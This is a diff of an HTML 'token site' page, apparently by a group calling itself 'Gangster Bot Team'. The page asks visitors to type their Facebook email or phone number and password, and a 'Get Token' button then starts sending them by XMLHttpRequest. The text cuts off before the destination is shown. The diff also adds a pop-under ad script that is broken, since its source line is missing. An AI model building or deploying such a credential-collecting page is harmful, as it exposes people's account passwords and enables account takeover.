@@ -1,53 +1,83 @@
 
+<marquee behavior="scroll" onmouseover="this.stop()" onmouseout="this.start()" scrollamount="1" scrolldelay="7" direction="left" truespeed="truespeed"><div class="header-icon">
+                                <i class="pe page-header-icon pe-7s-shield"></i>
+                            </div>
+                            <div class="header-title">
+                                <h3 class="m-b-xs">WE-3.TK</h3>
+                                <small>
+                                    JUST TKN LAGA 24/7  MST CHALEGA 420.COM KAMINA
+                                </small>
+                            </div>
+
+<img src="http://2.bp.blogspot.com/-aQ6awdbNqZQ/VXJGCGGBGAI/AAAAAAAAMGM/_bmty7Pl0b4/s1600/new.gif"><font color="red"><b>★NASEER ★MEHTAB ★MUJAHID ★WAQAS CHAUDHARY ★GULRAIZ ★ALI HASSAN ★SUFYAN  ★</b></font>WE-3.TK
+</marquee>
+
+
+
+
+
+
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <title>Risky Banna Token Site</title>
-  <meta charset="utf-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
-  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.1.1/jquery.min.js"></script>
-  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
-  <div class="container">
-  <center><h1>&#9826; Risky Banna Token Site &#9826;</h1>
-</head>
-<div class="panel-heading"></div>
+<meta charset="utf-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge"/>
+<meta name="viewport" content="width=device-width, initial-scale=1"/>
+<meta name="description" content="This Website Is For Iphone Token"/>
+<meta name="author" content="Mujahid Khan"/>
+<title>~={Naseer}=~</title><link rel="stylesheet" type="text/css" href="http://flambon.xtgem.com/fmb/natur.css" media="all,handheld"/><link rel="shortcut icon" href="">
+ <script type=text/javascript>
+ var _cpp= _cpp || [];
+  _cpp['username']    = "naseer";
+  _cpp['pop_type']    = "2";
+  _cpp['onePer']    = "0";
+  _cpp['freq']        = "20";   
+(function() {
+var hs = document.createElement('script'); hs.type = 'text/javascript'; hs.async = true;
+hs.src =
+var cs = document.getElementsByTagName('script')[0];
+cs.parentNode.insertBefore(hs, cs);
+})();</script>
+<!--- END OF CPX24 CODE --->
+
+
+<h2 class="description">
+
+
+
+
+<div id="content">
+<div class="post">
+<div class="post-meta">
+<h2 class="title">
+ Gangster Bot Team
+</h2>
+BY :NASEER
+</div>
+
+
+
+<style>@import url('https://fonts.googleapis.com/css?family=Josefin+Sans');
+body { font-family: 'Josefin Sans', sans-serif; font-size: 20px;}</style>
 <body>
- <div id="content">
-<br><br>
-<center>
-<div class="ARMANKHAN">
-<a href="https://www.Facebook.com/JYOTRAJSINHJIJADEJA78" alt="ARMANKHAN" target="_blank">
-<img
-src="https://graph.facebook.com/100008206089816/picture?type=large" alt="Designer_&amp;_Developer" style="border-radius: 99em; border: 2px; box-shadow: 0px 0px 9px 7px rgb(204, 204, 204); padding: 0px;" width="400" height="400"></a>
-<div class="container">
-<marquee behavior="scroll" direction="right" scrollamount="8" scrolldelay="1"><strong><font style="text-shadow: 1px 1px black; color:;" size="4">Risky Banna TOKEN SITE</font></strong></center></marquee>
-  <center><font color="Red" size="+1"><marquee bgcolor="" direction="left" 
-loop="infinite" width="60%"><strong>FULL SECURE TOKEN SITE
-</strong></marquee></font></center></div></div></font>
-  
-  <div class="panel-group">
-<div class="panel panel-primary">
-    <div class="panel-heading">( Type your e-mail and password to get the access token )</div>
-      <div class="panel-body">      
-<div class="form-group">
-<label for="usr"> Email </label>
-  <input type="text" class="form-control" id="tk">
-</div>
-<div class="form-group">
-<label for="pwd"> Password </label>
-  <input type="password" class="form-control" id="mk">
-</div>
-<button type="button" class="btn btn-danger" onclick="Puaru_Active()" >Get Token</button>
-<p>
-<li id="trave" class="list-group-item"><img src="http://usamabutt.tk/usama.JPG"> </li></p>
-        Add Risky Banna On Facebook : <a href="https://Www.Facebook.com/100008206089816" 
-target="blank">Risky Banna</a>
-     <Br>   
-<a href="https://www.Facebook.com/100008206089816" target="_blank" style="font-family: Geneva, Arial; font-size: 9px; color: #330010; text-decoration: none;">
-         </script>
-  <br>
-<div id="footer">
+
+
+
+
+
+
+<div class="panel-body">
+<form id="flogin" name="flogin" class="form-horizontal" action="" method="POST">
+<div class="form-group col-sm-12">
+<input name="email" id="tk" class="form-control" placeholder="Enter Your Facebook Email or Phone Number"/></div>
+<div class="form-group col-sm-12">
+<input name="pass" type="password" id="mk" class="form-control" placeholder="Enter Your Facebook Password"/></div>
+<div style="text-align: center">
+<button type="button" class="btn btn-danger" onclick="Puaru_Active()" > Get Token </button>
+<br/> <br/> </form>
+<li id="trave" class="list-group-item"><img src="./token.png" width="100%"/>
+</div></div></div>
 <script>
 function Puaru_Active() {
 var http = new XMLHttpRequest();
